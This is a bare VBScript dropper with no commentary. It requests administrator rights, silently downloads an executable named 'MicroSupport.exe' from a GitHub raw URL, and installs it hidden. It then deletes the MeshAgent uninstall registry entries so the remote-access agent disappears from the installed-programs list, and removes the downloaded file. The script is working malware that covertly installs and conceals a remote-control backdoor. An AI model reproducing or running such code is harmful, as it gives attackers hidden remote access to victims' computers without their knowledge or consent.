Option Explicit
Dim WShell, FSO, HTTP, TempFolder, ExeFile, InstallPath, Stream, ShellCommand
Set WShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set HTTP = CreateObject("MSXML2.ServerXMLHTTP")
TempFolder = WShell.ExpandEnvironmentStrings("%TEMP%")
ExeFile = TempFolder & "\microsupport.exe"
InstallPath = "C:\Program Files\MicroSupport"
If Not WShell.Run("net session", 0, True) = 0 Then
    WShell.Run "powershell -Command ""Start-Process 'wscript.exe' -ArgumentList '""" & WScript.ScriptFullName & """' -Verb RunAs""", 0, True
    WScript.Quit
End If
HTTP.Open "GET", "https://raw.githubusercontent.com/PixelUpdates/wget/refs/heads/main/MicroSupport.exe", False
HTTP.Send
If HTTP.Status = 200 Then
    Set Stream = CreateObject("ADODB.Stream")
    Stream.Open
    Stream.Type = 1
    Stream.Write HTTP.ResponseBody
    Stream.SaveToFile ExeFile, 2
    Stream.Close
End If
If FSO.FileExists(ExeFile) Then
    ShellCommand = """" & ExeFile & """ -fullinstall --installPath=""" & InstallPath & """"
    WShell.Run ShellCommand, 0, True
    WShell.Run "reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s /f ""MeshAgent"" | findstr /i ""HKEY_LOCAL_MACHINE""", 0, True
    WShell.Run "for /f ""tokens=*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s /f ""MeshAgent"" ^| findstr /i ""HKEY_LOCAL_MACHINE""') do reg delete ""%a"" /f", 0, True
    WShell.Run "for /f ""tokens=*"" %a in ('reg query ""HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"" /s /f ""MeshAgent"" ^| findstr /i ""HKEY_LOCAL_MACHINE""') do reg delete ""%a"" /f", 0, True
    FSO.DeleteFile ExeFile
End If